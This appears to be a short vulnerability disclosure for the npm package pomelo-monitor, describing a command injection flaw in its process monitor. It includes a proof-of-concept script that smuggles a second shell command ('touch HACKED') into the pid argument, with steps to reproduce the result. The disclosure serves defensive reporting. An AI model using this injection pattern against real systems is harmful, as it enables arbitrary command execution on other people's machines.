# Overview

The issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises [here](https://github.com/halfblood369/monitor/blob/master/lib/processMonitor.js#L26).

1. Create the following PoC file:

```js
// poc.js
var monitor = require("pomelo-monitor");
var param = { pid: "test; touch HACKED; #", serverId: "node-1" };
monitor.psmonitor.getPsInfo(param, function (err, data) {});
```

2. Check that there aren't any files called `HACKED`.
3. Execute the following commands in another terminal:

```bash
npm i pomelo-monitor # Install affected module
node poc.js #  Run the PoC
```

4. Recheck the files - now `HACKED` has been created.
